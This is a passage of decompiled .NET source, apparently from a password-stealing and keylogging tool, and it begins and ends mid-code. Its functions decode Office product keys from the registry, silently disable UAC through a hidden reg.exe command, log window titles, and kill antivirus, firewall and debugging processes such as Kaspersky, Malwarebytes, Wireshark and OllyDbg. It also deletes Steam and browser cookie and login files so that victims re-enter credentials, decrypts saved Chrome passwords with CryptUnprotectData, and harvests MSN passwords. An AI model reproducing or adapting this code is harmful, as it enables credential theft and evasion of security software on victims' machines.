              case 339:
              case 340:
                goto label_295;
              case 341:
              case 342:
                goto label_296;
              case 343:
                goto label_297;
              case 344:
                goto label_298;
              case 345:
                goto label_299;
              case 346:
                goto label_300;
              case 347:
                goto label_301;
              case 348:
                goto label_302;
              case 349:
                goto label_303;
              case 350:
                goto label_304;
              case 351:
                goto label_305;
              case 352:
                goto label_306;
              case 353:
              case 354:
                goto label_307;
              case 355:
                goto label_308;
              case 356:
                goto label_309;
              case 357:
                goto label_310;
              case 358:
                goto label_311;
              case 359:
                goto label_312;
              case 360:
                goto label_313;
              case 361:
                goto label_314;
              case 362:
              case 363:
                goto label_315;
              case 364:
                goto label_316;
              case 365:
                goto label_317;
              case 366:
                goto label_318;
              case 367:
                goto label_319;
              case 368:
                goto label_320;
              case 369:
                goto label_321;
              case 370:
                goto label_322;
              case 371:
                goto label_323;
              case 372:
                goto label_324;
              case 373:
                goto label_325;
              case 374:
              case 375:
              case 378:
              case 379:
                goto label_328;
              case 376:
                goto label_326;
              case 377:
                goto label_327;
              case 380:
                goto label_329;
              case 381:
                goto label_330;
              case 382:
              case 383:
                goto label_331;
              case 384:
                goto label_332;
              case 385:
              case 386:
                goto label_333;
              case 387:
                goto label_334;
              case 388:
                goto label_335;
              case 389:
                goto label_336;
              case 390:
              case 393:
              case 396:
              case 399:
              case 400:
              case 401:
                goto label_343;
              case 391:
                goto label_337;
              case 392:
                goto label_338;
              case 394:
                goto label_339;
              case 395:
                goto label_340;
              case 397:
                goto label_341;
              case 398:
                goto label_342;
              case 402:
                goto label_344;
              case 403:
                goto label_345;
              case 404:
                goto label_346;
              case 405:
              case 408:
              case 409:
                goto label_349;
              case 406:
                goto label_347;
              case 407:
                goto label_348;
              case 410:
                goto label_350;
              case 411:
                goto label_351;
              case 412:
                goto label_352;
              case 413:
              case 416:
              case 417:
                goto label_355;
              case 414:
                goto label_353;
              case 415:
                goto label_354;
              case 418:
                goto label_356;
              case 419:
                goto label_357;
              case 420:
                goto label_358;
              case 421:
                goto label_359;
              case 422:
                goto label_360;
              case 423:
              case 426:
              case 427:
                goto label_363;
              case 424:
                goto label_361;
              case 425:
                goto label_362;
              case 428:
                goto label_364;
              case 429:
                goto label_365;
              case 430:
                goto label_366;
              case 431:
              case 434:
              case 435:
                goto label_369;
              case 432:
                goto label_367;
              case 433:
                goto label_368;
              case 436:
                goto label_370;
              case 437:
                goto label_371;
              case 438:
                goto label_372;
              case 439:
              case 442:
              case 443:
                goto label_375;
              case 440:
                goto label_373;
              case 441:
                goto label_374;
              case 444:
                goto label_376;
              case 445:
                goto label_377;
              case 446:
                goto label_378;
              case 447:
              case 450:
              case 451:
                goto label_387;
              case 448:
                goto label_379;
              case 449:
                goto label_380;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_382;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_387:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public void office_fuckkey()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_1:
        int num3 = 2;
        string str = (string) Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Office\\12.0\\Registration\\{91120000-002F-0000-0000-0000000FF1CE}").GetValue("ProductName");
label_2:
        num3 = 3;
        this.officekey = this.officekey + str + "\r\n";
label_3:
        num3 = 4;
        byte[] digitalProductId = xxx.GetRegistryDigitalProductId(xxx.Key.Office12);
label_4:
        num3 = 5;
        this.officekey = this.officekey + xxx.DecodeProductKey(digitalProductId) + "\r\n\r\n";
        goto label_11;
label_6:
        num2 = num3;
        switch (num1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_11;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_6;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_11:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private void Label14_Click(object sender, EventArgs e)
    {
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
      if (Operators.CompareString(this.strin, this.GetActiveWindowTitle(), false) == 0)
        return;
      this.TextBox1.Text = this.TextBox1.Text + "\r\n[------" + this.GetActiveWindowTitle() + "------]\r\n";
      this.strin = this.GetActiveWindowTitle();
    }

    public void Fuck_Uac()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_1:
        int num3 = 2;
        Interaction.Shell("C:\\Windows\\System32\\cmd.exe /k %windir%\\System32\\reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f", AppWinStyle.Hide);
        goto label_8;
label_3:
        num2 = num3;
        switch (num1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_8;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_3;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_8:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public void AntiKeyscrambler()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_1:
        int num3 = 2;
        Process[] processes = Process.GetProcesses();
label_2:
        num3 = 3;
        int num4 = checked (processes.Length - 1);
        int index = 0;
        goto label_7;
label_3:
        num3 = 4;
        string Left = Microsoft.VisualBasic.Strings.LCase(processes[index].ProcessName);
label_4:
        num3 = 7;
        if (Operators.CompareString(Left, "keyscrambler", false) != 0)
          goto label_6;
label_5:
        num3 = 8;
        processes[index].Kill();
label_6:
        num3 = 12;
        checked { ++index; }
label_7:
        if (index <= num4)
          goto label_3;
        else
          goto label_14;
label_9:
        num2 = num3;
        switch (num1)
        {
          case 1:
            int num5 = num2 + 1;
            num2 = 0;
            switch (num5)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
              case 9:
              case 10:
              case 11:
              case 12:
                goto label_6;
              case 6:
              case 7:
                goto label_4;
              case 8:
                goto label_5;
              case 13:
                goto label_14;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_9;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_14:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public void AntiWireshark()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_1:
        int num3 = 2;
        Process[] processes = Process.GetProcesses();
label_2:
        num3 = 3;
        int num4 = checked (processes.Length - 1);
        int index = 0;
        goto label_7;
label_3:
        num3 = 4;
        string Left = Microsoft.VisualBasic.Strings.LCase(processes[index].ProcessName);
label_4:
        num3 = 7;
        if (Operators.CompareString(Left, "wireshark", false) != 0)
          goto label_6;
label_5:
        num3 = 8;
        processes[index].Kill();
label_6:
        num3 = 12;
        checked { ++index; }
label_7:
        if (index <= num4)
          goto label_3;
        else
          goto label_14;
label_9:
        num2 = num3;
        switch (num1)
        {
          case 1:
            int num5 = num2 + 1;
            num2 = 0;
            switch (num5)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
              case 9:
              case 10:
              case 11:
              case 12:
                goto label_6;
              case 6:
              case 7:
                goto label_4;
              case 8:
                goto label_5;
              case 13:
                goto label_14;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_9;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_14:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public void AntiAnubis()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_1:
        int num3 = 2;
        Process[] processes = Process.GetProcesses();
label_2:
        num3 = 3;
        int num4 = checked (processes.Length - 1);
        int index = 0;
        goto label_7;
label_3:
        num3 = 4;
        string Left = Microsoft.VisualBasic.Strings.LCase(processes[index].ProcessName);
label_4:
        num3 = 7;
        if (Operators.CompareString(Left, "anubis", false) != 0)
          goto label_6;
label_5:
        num3 = 8;
        processes[index].Kill();
label_6:
        num3 = 12;
        checked { ++index; }
label_7:
        if (index <= num4)
          goto label_3;
        else
          goto label_14;
label_9:
        num2 = num3;
        switch (num1)
        {
          case 1:
            int num5 = num2 + 1;
            num2 = 0;
            switch (num5)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
              case 9:
              case 10:
              case 11:
              case 12:
                goto label_6;
              case 6:
              case 7:
                goto label_4;
              case 8:
                goto label_5;
              case 13:
                goto label_14;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_9;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_14:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public void AntiMalwarebytes()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_1:
        int num3 = 2;
        Process[] processes = Process.GetProcesses();
label_2:
        num3 = 3;
        int num4 = checked (processes.Length - 1);
        int index = 0;
        goto label_7;
label_3:
        num3 = 4;
        string Left = Microsoft.VisualBasic.Strings.LCase(processes[index].ProcessName);
label_4:
        num3 = 7;
        if (Operators.CompareString(Left, "mbam", false) != 0)
          goto label_6;
label_5:
        num3 = 8;
        processes[index].Kill();
label_6:
        num3 = 12;
        checked { ++index; }
label_7:
        if (index <= num4)
          goto label_3;
        else
          goto label_14;
label_9:
        num2 = num3;
        switch (num1)
        {
          case 1:
            int num5 = num2 + 1;
            num2 = 0;
            switch (num5)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
              case 9:
              case 10:
              case 11:
              case 12:
                goto label_6;
              case 6:
              case 7:
                goto label_4;
              case 8:
                goto label_5;
              case 13:
                goto label_14;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_9;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_14:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public void AntiKaspersky()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_1:
        int num3 = 2;
        Process[] processes = Process.GetProcesses();
label_2:
        num3 = 3;
        int num4 = checked (processes.Length - 1);
        int index = 0;
        goto label_7;
label_3:
        num3 = 4;
        string Left = Microsoft.VisualBasic.Strings.LCase(processes[index].ProcessName);
label_4:
        num3 = 7;
        if (Operators.CompareString(Left, "avp", false) != 0)
          goto label_6;
label_5:
        num3 = 8;
        processes[index].Kill();
label_6:
        num3 = 12;
        checked { ++index; }
label_7:
        if (index <= num4)
          goto label_3;
        else
          goto label_14;
label_9:
        num2 = num3;
        switch (num1)
        {
          case 1:
            int num5 = num2 + 1;
            num2 = 0;
            switch (num5)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
              case 9:
              case 10:
              case 11:
              case 12:
                goto label_6;
              case 6:
              case 7:
                goto label_4;
              case 8:
                goto label_5;
              case 13:
                goto label_14;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_9;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_14:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public void AntiOllydbg()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_1:
        int num3 = 2;
        Process[] processes = Process.GetProcesses();
label_2:
        num3 = 3;
        int num4 = checked (processes.Length - 1);
        int index = 0;
        goto label_7;
label_3:
        num3 = 4;
        string Left = Microsoft.VisualBasic.Strings.LCase(processes[index].ProcessName);
label_4:
        num3 = 7;
        if (Operators.CompareString(Left, "ollydbg", false) != 0)
          goto label_6;
label_5:
        num3 = 8;
        processes[index].Kill();
label_6:
        num3 = 12;
        checked { ++index; }
label_7:
        if (index <= num4)
          goto label_3;
        else
          goto label_14;
label_9:
        num2 = num3;
        switch (num1)
        {
          case 1:
            int num5 = num2 + 1;
            num2 = 0;
            switch (num5)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
              case 9:
              case 10:
              case 11:
              case 12:
                goto label_6;
              case 6:
              case 7:
                goto label_4;
              case 8:
                goto label_5;
              case 13:
                goto label_14;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_9;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_14:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public void AntiOutpost()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_1:
        int num3 = 2;
        Process[] processes = Process.GetProcesses();
label_2:
        num3 = 3;
        int num4 = checked (processes.Length - 1);
        int index = 0;
        goto label_7;
label_3:
        num3 = 4;
        string Left = Microsoft.VisualBasic.Strings.LCase(processes[index].ProcessName);
label_4:
        num3 = 7;
        if (Operators.CompareString(Left, "outpost", false) != 0)
          goto label_6;
label_5:
        num3 = 8;
        processes[index].Kill();
label_6:
        num3 = 12;
        checked { ++index; }
label_7:
        if (index <= num4)
          goto label_3;
        else
          goto label_14;
label_9:
        num2 = num3;
        switch (num1)
        {
          case 1:
            int num5 = num2 + 1;
            num2 = 0;
            switch (num5)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
              case 9:
              case 10:
              case 11:
              case 12:
                goto label_6;
              case 6:
              case 7:
                goto label_4;
              case 8:
                goto label_5;
              case 13:
                goto label_14;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_9;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_14:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public void AntiNorman()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_1:
        int num3 = 2;
        Process[] processes = Process.GetProcesses();
label_2:
        num3 = 3;
        int num4 = checked (processes.Length - 1);
        int index = 0;
        goto label_7;
label_3:
        num3 = 4;
        string Left = Microsoft.VisualBasic.Strings.LCase(processes[index].ProcessName);
label_4:
        num3 = 7;
        if (Operators.CompareString(Left, "npfmsg", false) != 0)
          goto label_6;
label_5:
        num3 = 8;
        processes[index].Kill();
label_6:
        num3 = 12;
        checked { ++index; }
label_7:
        if (index <= num4)
          goto label_3;
        else
          goto label_14;
label_9:
        num2 = num3;
        switch (num1)
        {
          case 1:
            int num5 = num2 + 1;
            num2 = 0;
            switch (num5)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
              case 9:
              case 10:
              case 11:
              case 12:
                goto label_6;
              case 6:
              case 7:
                goto label_4;
              case 8:
                goto label_5;
              case 13:
                goto label_14;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_9;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_14:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public void AntiBitDefender()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_1:
        int num3 = 2;
        Process[] processes = Process.GetProcesses();
label_2:
        num3 = 3;
        int num4 = checked (processes.Length - 1);
        int index = 0;
        goto label_7;
label_3:
        num3 = 4;
        string Left = Microsoft.VisualBasic.Strings.LCase(processes[index].ProcessName);
label_4:
        num3 = 7;
        if (Operators.CompareString(Left, "bdagent", false) != 0)
          goto label_6;
label_5:
        num3 = 8;
        processes[index].Kill();
label_6:
        num3 = 12;
        checked { ++index; }
label_7:
        if (index <= num4)
          goto label_3;
        else
          goto label_14;
label_9:
        num2 = num3;
        switch (num1)
        {
          case 1:
            int num5 = num2 + 1;
            num2 = 0;
            switch (num5)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
              case 9:
              case 10:
              case 11:
              case 12:
                goto label_6;
              case 6:
              case 7:
                goto label_4;
              case 8:
                goto label_5;
              case 13:
                goto label_14;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_9;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_14:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public void AntiNOD32()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_1:
        int num3 = 2;
        Process[] processes = Process.GetProcesses();
label_2:
        num3 = 3;
        int num4 = checked (processes.Length - 1);
        int index = 0;
        goto label_7;
label_3:
        num3 = 4;
        string Left = Microsoft.VisualBasic.Strings.LCase(processes[index].ProcessName);
label_4:
        num3 = 7;
        if (Operators.CompareString(Left, "egui", false) != 0)
          goto label_6;
label_5:
        num3 = 8;
        processes[index].Kill();
label_6:
        num3 = 12;
        checked { ++index; }
label_7:
        if (index <= num4)
          goto label_3;
        else
          goto label_14;
label_9:
        num2 = num3;
        switch (num1)
        {
          case 1:
            int num5 = num2 + 1;
            num2 = 0;
            switch (num5)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
              case 9:
              case 10:
              case 11:
              case 12:
                goto label_6;
              case 6:
              case 7:
                goto label_4;
              case 8:
                goto label_5;
              case 13:
                goto label_14;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_9;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_14:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public void AntiZoneAlarm()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_1:
        int num3 = 2;
        Process[] processes = Process.GetProcesses();
label_2:
        num3 = 3;
        int num4 = checked (processes.Length - 1);
        int index = 0;
        goto label_7;
label_3:
        num3 = 4;
        string Left = Microsoft.VisualBasic.Strings.LCase(processes[index].ProcessName);
label_4:
        num3 = 7;
        if (Operators.CompareString(Left, "zlclient", false) != 0)
          goto label_6;
label_5:
        num3 = 8;
        processes[index].Kill();
label_6:
        num3 = 12;
        checked { ++index; }
label_7:
        if (index <= num4)
          goto label_3;
        else
          goto label_14;
label_9:
        num2 = num3;
        switch (num1)
        {
          case 1:
            int num5 = num2 + 1;
            num2 = 0;
            switch (num5)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
              case 9:
              case 10:
              case 11:
              case 12:
                goto label_6;
              case 6:
              case 7:
                goto label_4;
              case 8:
                goto label_5;
              case 13:
                goto label_14;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_9;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_14:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public void forcesteam()
    {
      try
      {
        string path = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\Steam\\config\\SteamAppData.vdf";
        if (System.IO.File.Exists(path))
          System.IO.File.Delete(path);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        string path = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\Steam\\config\\SteamAppData.vdf";
        if (!System.IO.File.Exists(path))
          return;
        System.IO.File.Delete(path);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void steam()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_1:
        int num3 = 2;
        string str = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Valve\\Steam", "InstallPath", (object) null));
label_2:
        num3 = 3;
        FileSystem.Kill(str + "ClientRegistry.blob");
        goto label_9;
label_4:
        num2 = num3;
        switch (num1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_9;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_4;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_9:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public void KillProcesses(bool InternetExplorer, bool Firefox)
    {
      Process[] processes = Process.GetProcesses();
      int index = 0;
      while (index < processes.Length)
      {
        Process process = processes[index];
        if (Firefox)
        {
          if (process.MainWindowTitle.Contains("Mozilla Firefox"))
            process.Kill();
          else if (Operators.CompareString(process.ProcessName, "firefox.exe", false) == 0)
            process.Kill();
        }
        if (InternetExplorer)
        {
          if (process.MainWindowTitle.Contains("Internet Explorer"))
            process.Kill();
          else if (Operators.CompareString(process.ProcessName, "iexplore.exe", false) == 0)
            process.Kill();
        }
        checked { ++index; }
      }
    }

    public void DeleteIECookies(bool Enable)
    {
      if (!Enable)
        return;
      string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Cookies);
      if (!Directory.Exists(folderPath))
        return;
      try
      {
        foreach (string file in MyProject.Computer.FileSystem.GetFiles(folderPath))
        {
          try
          {
            MyProject.Computer.FileSystem.DeleteFile(file);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
      }
      finally
      {
        IEnumerator<string> enumerator;
        enumerator?.Dispose();
      }
    }

    public void DeleteMozillaCookies(bool Enable)
    {
      if (!Enable)
        return;
      string str = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles";
      if (!Directory.Exists(str))
        return;
      try
      {
        foreach (string directory in MyProject.Computer.FileSystem.GetDirectories(str))
        {
          try
          {
            foreach (string file in MyProject.Computer.FileSystem.GetFiles(directory))
            {
              if (file.Contains("cookie"))
              {
                try
                {
                  MyProject.Computer.FileSystem.DeleteFile(file);
                }
                catch (Exception ex)
                {
                  ProjectData.SetProjectError(ex);
                  ProjectData.ClearProjectError();
                }
              }
            }
          }
          finally
          {
            IEnumerator<string> enumerator;
            enumerator?.Dispose();
          }
        }
      }
      finally
      {
        IEnumerator<string> enumerator;
        enumerator?.Dispose();
      }
    }

    public void DeleteMozillaSignons(bool Enable)
    {
      if (!Enable)
        return;
      string str = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles";
      if (!Directory.Exists(str))
        return;
      try
      {
        foreach (string directory in MyProject.Computer.FileSystem.GetDirectories(str))
        {
          try
          {
            foreach (string file in MyProject.Computer.FileSystem.GetFiles(directory))
            {
              if (file.Contains("signon"))
              {
                try
                {
                  MyProject.Computer.FileSystem.DeleteFile(file);
                }
                catch (Exception ex)
                {
                  ProjectData.SetProjectError(ex);
                  ProjectData.ClearProjectError();
                }
              }
            }
          }
          finally
          {
            IEnumerator<string> enumerator;
            enumerator?.Dispose();
          }
        }
      }
      finally
      {
        IEnumerator<string> enumerator;
        enumerator?.Dispose();
      }
    }

    public void GetChrome()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_1:
        int num3 = 2;
        string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Web Data";
label_2:
        num3 = 3;
        if (!System.IO.File.Exists(path))
          goto label_26;
label_3:
        num3 = 4;
        SqlConnection sqlConnection = new SqlConnection();
label_4:
        num3 = 5;
        sqlConnection.ConnectionString = "Data Source=" + path + ";";
label_5:
        num3 = 6;
        sqlConnection.Open();
label_6:
        num3 = 7;
        SqlCommand command = sqlConnection.CreateCommand();
label_7:
        num3 = 8;
        command.CommandText = "SELECT * FROM logins";
label_8:
        num3 = 9;
        SqlDataReader sqlDataReader = command.ExecuteReader();
        goto label_17;
label_9:
        num3 = 12;
        string str = Conversions.ToString(sqlDataReader["origin_url"]);
label_10:
        num3 = 13;
        string Left1 = Conversions.ToString(sqlDataReader["username_value"]);
label_11:
        num3 = 14;
        string Left2 = Form1.Decrypt((byte[]) sqlDataReader["password_value"]);
label_12:
        num3 = 15;
        if (!(Operators.CompareString(Left1, "", false) != 0 & Operators.CompareString(Left2, "", false) != 0))
          goto label_17;
label_13:
        num3 = 16;
        ListViewItem listViewItem = new ListViewItem();
label_14:
        num3 = 17;
        listViewItem.Text = str;
label_15:
        num3 = 18;
        this.chromefuck = "---------------------------------------------\r\nWebsite: " + str + "\r\nUsername: " + Left1 + "\r\nPassword: " + Left2 + "\r\n---------------------------------------------\r\n ";
label_16:
        num3 = 19;
        this.TextBox8.Text = this.chromefuck;
label_17:
        num3 = 11;
        if (sqlDataReader.Read())
          goto label_9;
label_18:
        num3 = 22;
        command.Dispose();
label_19:
        num3 = 23;
        sqlConnection.Close();
        goto label_26;
label_21:
        num2 = num3;
        switch (num1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
                goto label_7;
              case 9:
                goto label_8;
              case 10:
              case 11:
              case 20:
              case 21:
                goto label_17;
              case 12:
                goto label_9;
              case 13:
                goto label_10;
              case 14:
                goto label_11;
              case 15:
                goto label_12;
              case 16:
                goto label_13;
              case 17:
                goto label_14;
              case 18:
                goto label_15;
              case 19:
                goto label_16;
              case 22:
                goto label_18;
              case 23:
                goto label_19;
              case 24:
              case 25:
                goto label_26;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_21;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_26:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    [DllImport("Crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern bool CryptUnprotectData(
      ref Form1.DATA_BLOB pDataIn,
      string szDataDescr,
      ref Form1.DATA_BLOB pOptionalEntropy,
      IntPtr pvReserved,
      ref Form1.CRYPTPROTECT_PROMPTSTRUCT pPromptStruct,
      int dwFlags,
      ref Form1.DATA_BLOB pDataOut);

    public static string Decrypt(byte[] Datas)
    {
      Form1.DATA_BLOB dataBlob1 = new Form1.DATA_BLOB();
      Form1.DATA_BLOB dataBlob2 = new Form1.DATA_BLOB();
      GCHandle gcHandle = GCHandle.Alloc((object) Datas, GCHandleType.Pinned);
      dataBlob1.pbData = gcHandle.AddrOfPinnedObject();
      dataBlob1.cbData = Datas.Length;
      gcHandle.Free();
      ref Form1.DATA_BLOB local1 = ref dataBlob1;
      Form1.DATA_BLOB dataBlob3;
      Form1.DATA_BLOB dataBlob4 = dataBlob3;
      ref Form1.DATA_BLOB local2 = ref dataBlob4;
      IntPtr num;
      IntPtr pvReserved = num;
      Form1.CRYPTPROTECT_PROMPTSTRUCT cryptprotectPromptstruct1;
      Form1.CRYPTPROTECT_PROMPTSTRUCT cryptprotectPromptstruct2 = cryptprotectPromptstruct1;
      ref Form1.CRYPTPROTECT_PROMPTSTRUCT local3 = ref cryptprotectPromptstruct2;
      ref Form1.DATA_BLOB local4 = ref dataBlob2;
      Form1.CryptUnprotectData(ref local1, (string) null, ref local2, pvReserved, ref local3, 0, ref local4);
      byte[] numArray = new byte[checked (dataBlob2.cbData + 1)];
      Marshal.Copy(dataBlob2.pbData, numArray, 0, dataBlob2.cbData);
      string str = Encoding.Default.GetString(numArray);
      return str.Substring(0, checked (str.Length - 1));
    }

    private void msn_fuck_x()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_1:
        int num3 = 2;
        IEnumerator<CMSNExplorerPassword> enumerator1 = this.PMSNExplorer.GetEnumerator();
        goto label_5;
label_3:
        num3 = 3;
        CMSNExplorerPassword current1;
        this.msn1 = "---------------------------------------------\r\nEmail: " + current1.Email + "\r\nPassword: " + current1.Password + "\r\n--------------------------------------------- ";
label_4:
        num3 = 4;
label_5:
